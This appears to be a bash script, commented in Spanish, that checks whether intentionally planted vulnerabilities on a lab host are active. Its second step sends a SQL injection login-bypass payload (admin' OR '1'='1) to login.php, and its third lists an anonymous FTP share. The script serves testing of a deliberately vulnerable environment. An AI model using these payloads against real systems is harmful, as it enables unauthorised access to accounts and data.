#!/bin/bash
# Comprobación rápida de que las vulnerabilidades del cliente están activas.
# Se ejecuta desde la red de tránsito (vantage del atacante externo).
T=172.20.17.230

echo "=== 1) Web pública (HTTP) ==="
curl -s -m6 -o /dev/null -w "  index.php -> HTTP %{http_code}\n" "http://$T/"

echo "=== 2) SQL injection (bypass de login) ==="
code=$(curl -s -m6 -o /dev/null -w "%{http_code}" \
  --data-urlencode "usuario=admin' OR '1'='1" \
  --data-urlencode "password=x" "http://$T/login.php")
loc=$(curl -s -m6 -D - -o /dev/null \
  --data-urlencode "usuario=admin' OR '1'='1" \
  --data-urlencode "password=x" "http://$T/login.php" | grep -i '^location:')
echo "  login.php (inyección) -> HTTP $code $loc"

echo "=== 3) FTP anónimo ==="
curl -s -m6 --ftp-method nocwd "ftp://$T/" --user anonymous: 2>/dev/null | awk '{print "  "$NF}'

echo "=== 4) SSH target expuesto (2222) ==="
banner=$(timeout 4 bash -c "exec 3<>/dev/tcp/$T/2222; head -1 <&3" 2>/dev/null)
echo "  banner: $banner"

echo "FIN"
